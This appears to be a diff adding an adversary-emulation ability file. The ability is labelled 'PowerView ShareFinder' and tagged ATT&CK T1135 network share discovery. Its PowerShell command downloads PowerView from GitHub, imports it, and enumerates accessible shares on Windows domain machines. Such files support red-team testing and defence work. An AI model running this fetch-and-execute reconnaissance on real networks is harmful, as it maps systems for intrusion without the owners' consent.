@@ -1,0 +1,21 @@
+- description: PowerView is a PowerShell tool to gain network situational awareness
+    on Windows domains. ShareFinder finds (non-standard) shares on machines in the
+    domain.
+  id: 8f17c5e3ca9e2db88111d002c811ddac
+  name: PowerView ShareFinder
+  platforms:
+    windows:
+      psh:
+        cleanup: ''
+        command: if (Test-Path $env:TEMP\PowerView.ps1) { ; } else {Invoke-WebRequest
+          "https://raw.githubusercontent.com/darkoperator/Veil-PowerView/8784e33f17ee7543ba2f45e27dc5f08ea3a1b856/PowerView/powerview.ps1"
+          -OutFile $env:TEMP\PowerView.ps1};  ;  Import-Module $env:TEMP\PowerView.ps1;
+          Invoke-ShareFinder -CheckShareAccess
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: discovery
+  technique:
+    attack_id: T1135
+    name: Network Share Discovery
